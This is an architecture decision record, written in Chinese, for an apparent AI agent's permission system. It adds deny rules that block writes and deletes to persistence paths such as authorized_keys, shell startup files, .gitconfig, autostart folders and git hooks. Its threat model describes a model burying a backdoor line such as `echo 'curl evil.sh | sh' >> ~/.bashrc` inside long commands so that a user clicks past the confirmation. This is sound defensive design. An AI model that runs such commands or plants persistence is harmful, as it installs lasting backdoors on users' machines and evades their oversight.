# ADR-0027 · 持久化路径不许写：ADR-0025 读取侧的另一半，`shell.exec` 给了它第一个真实载体

- **状态**：🟢 Accepted（2026-08-07）
- **日期**：2026-08-07
- **相关**：[ADR-0025](./0025-敏感路径的读取拒绝.md) 明确留下的遗留（"写入侧仍然敞着"）；
  依赖 [ADR-0023](./0023-权限规则的分层覆盖.md)（用户要有覆盖的出口）；
  与 [ADR-0026](./0026-命令的主张分解与argv契约.md) 同一批落地——`shell.exec`
  一上，`echo … >> ~/.zshrc` 才有了真实的执行载体

## 背景

ADR-0025 把读取侧的敏感路径 deny 补上时，明确写下了对称面还没做：

> 写入侧仍然敞着：往 `~/.ssh/authorized_keys` 追加一行是标准的持久化后门，
> 而它现在只是 `def.fs-write` 的一个 ask。同类还有 `~/.bashrc`、
> `~/Library/LaunchAgents/**` 这一批"写一次、之后每次开机都执行"的路径。

在 M1-c，这句话还只是一个理论上的缺口——当时唯一能写文件的是 `fs.write` 工具，
模型要往 `~/.zshrc` 里加一行，需要先构造一个看起来正当的文件写入请求，用户面对
的确认框至少看得出"目标路径是 `~/.zshrc`"。`shell.exec` 落地（ADR-0026）之后，
这条路径多了一种更隐蔽的走法：`echo 'curl evil.sh | sh' >> ~/.bashrc` 混在一长串
正当命令中间，用户面对的是一整条命令行的确认框，而不是一个专门标注"要改 shell
配置"的提示。**这一批路径的共同形状不是"重要文件"，是持久化**：改动本身不起眼，
但它把一次性的越权变成了一个此后一直在的后门。

## 决策

### 一、挑选标准与 ADR-0025 相同的形状，换一个维度

> **写一次，之后每次开机 / 开终端 / 开某个工具都会自动执行。**

家目录下 14 条：`.ssh/authorized_keys`、`.ssh/config`（`ProxyCommand` /
`LocalCommand` 会在每次连接时执行）、四个 bash 生命周期文件
（`.bashrc` / `.bash_profile` / `.bash_logout` / `.profile`）、三个 zsh 生命周期
文件（`.zshrc` / `.zshenv` / `.zprofile`）、`.gitconfig`（`alias` / `core.pager`
是会被执行的命令）、三个平台的开机自启目录
（`.config/autostart/**`、`.config/systemd/user/**`、`Library/LaunchAgents/**`、
Windows 的 Startup 目录）。跟着项目走的 1 条：`**/.git/hooks/**`——它不在家目录下，
而是躺在任何一个工作区里，此后每次 `commit` / `checkout` 都会执行它，而这些命令
用户自己每天都在敲。

### 二、是普通 deny，不是红线；出口写在拒绝文案里

与 ADR-0025 同一个判断：这批路径的攻击形态**恰恰就是一个用户会顺手点掉的确认框**。
模型在长任务中间说一句"我需要写一下 shell 配置"，确认框和平时那些没有区别。
红线留给"做了就回不来"，这里是"做了就装上了一个后门"——正确解法是给一个
**必须由用户显式打开**的出口：拒绝文案里直接写"确属你的本意的话，在用户配置里
对这个路径写一条 allow 即可放开"。「帮我往 `.zshrc` 加个 alias」这类完全正当的
请求会被拦，这是已知代价，不是意外。

### 三、`fs.write` 与 `fs.delete` 两个能力都挂

删掉 `.zshrc` 再写一个新的，与直接改它是同一件事。只挂写入侧就留下一条
"先删后建"的路——而这正是 ADR-0014 那半个教训：**规则要按目标写，不能按调用方
自称在做哪一步写。** 每条路径产出两条规则（`def.no-write-<id>` /
`def.no-write-<id>-delete`），共享同一份 `why` 理由文案。

### 四、`shell.exec` 不需要专门适配就能撞上这批规则

ADR-0026 的命令主张分解里，`tee` / `cp` / `mv` 落在写操作数、`>` / `>>` 重定向
产出 `fs.write` 主张——`echo x >> ~/.zshrc` 拆出来的正是一条
`fs.write /home/ming/.zshrc` 主张，直接撞上这里新增的规则，**一条新代码都不用为
`shell.exec` 写**。这是两份 ADR 按目标而不是按调用方写规则的红利在这里的
第二次体现（第一次是 ADR-0025 的读取侧同理覆盖 `cat` / `ls`）。

## 后果

- `.gitconfig` 与 `.git/hooks/**` 同时被拦，覆盖了"改配置让 git 帮忙执行"与
  "直接挂钩子"两条路
- YOLO 档跳不过它（YOLO 跳的是 ask，不是 deny，docs/09 C5 / ADR-0017）
- 用户被拦时看到的 `reason` 里带着出口的说法，与 ADR-0025 同一个理由：
  一条只说"不行"的规则，用户的下一步是去关掉整个功能

## 反向演练

| 演练 | 结果 |
|---|---|
| 去掉 `persistencePathRules(env)` | 家目录与项目两批规则全部消失，`.zshrc` / `authorized_keys` 写入回到 `def.fs-write` 的 ask |
| 压得住 `def.fs-write` 的 ask | 层内 deny > ask，验证过（`policy-persistence-write.test.ts` "压得住 def.fs-write 的 ask"） |
| 用户在配置里写一条 allow | 真的放开，与 ADR-0025 同一条出口逻辑（"用户放开某一个路径就真的放开了"） |
| YOLO 档 | 跳不过（"YOLO 跳不过它"） |
| 读侧 | 不受影响——"想知道 `.zshrc` 里写了什么"是完全正当的请求 |
| `shell.exec` 跑 `echo x >> ~/.zshrc` | 命中新增规则，没有为 `shell.exec` 写任何专门代码（`shell-claims.test.ts` "往 .zshrc 追加撞上 ADR-0027 的写入 deny"） |

8 条新增用例（`policy-persistence-write.test.ts`）。

## 遗留

- **`env.read` 仍是无条件 allow。** ADR-0025 就已经指出这一点，`shell.exec`
  落地之后它是真的活了——`sh -c 'echo $XM_API_KEY'` 之所以读不出密钥，靠的是
  `shell-exec.ts` 的 env 白名单（ADR-0026 决策七），而不是这里的任何一条策略
  规则。`env.read` 这条能力本身仍然没有工具声明它、没有规则约束它，
  是一条结构上已经具备条件但尚未处理的缺口
- **写入侧的清单目前只覆盖"会被自动执行"这一类。** 覆盖敏感数据本身的路径
  （私钥文件被覆盖重写、`.aws/credentials` 被篡改）不在这份清单的挑选标准
  之内——那属于"内容被篡改"而不是"被安装持久化后门"，是否需要单独的写入侧
  规则留待真实需求出现时再评估
